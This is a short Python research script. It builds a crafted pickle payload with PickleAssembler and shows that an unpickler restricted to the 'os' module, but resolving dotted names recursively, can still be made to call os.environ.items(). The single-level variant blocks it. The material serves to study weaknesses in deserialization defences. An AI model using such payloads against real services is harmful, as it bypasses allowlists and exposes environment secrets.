"""Check if we can call os.environ.items() with a single-acquisition and a
recursive unpickler that restrict only the module name to 'os'"""

import io
import os
import pickle
import sys

from pickleassem import PickleAssembler


# Pain pickle paper calls this "recursive acquisition" and it's similar to what
# the (at least python implementation) of pickle does by default in find_class.
# We just split the name at each '.' and recursively call getattr
class RestrictedUnpicklerRecursive(pickle.Unpickler):

    def find_class(self, module, name):

        if module != "os":
            raise pickle.UnpicklingError("module %s is forbidden" % (module))
        # Get the actual module from the string
        obj = sys.modules[module]
        for subpath in name.split("."):
            try:
                obj = getattr(obj, subpath)
            except AttributeError:
                raise AttributeError(
                    "Can't get attribute {!r} on {!r}".format(name, module)
                ) from None
        return obj


# Pain pickle paper calls this "single-level acquisition" (i.e., directly calling
# getattr without any additional parsing of the module/name)
class RestrictedUnpicklerSingle(pickle.Unpickler):

    def find_class(self, module, name):
        if module == "os":
            return getattr(os, name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


if __name__ == "__main__":

    pa = PickleAssembler(proto=4)
    pa.push_short_binunicode("os")
    pa.push_short_binunicode("environ.items")
    pa.build_stack_global()
    pa.push_mark()
    pa.build_tuple()
    pa.build_reduce()

    payload = pa.assemble()

    f = io.BytesIO(payload)

    # 1. A custom unpickler (restricting to the module os) with
    # single-acquisition doesn't allow us to call os.environ.items() (no attribute
    # environ.items on os)
    # print(RestrictedUnpicklerSingle(f).load())

    # 2. It works with a recursive unpickler
    print(RestrictedUnpicklerRecursive(f).load())
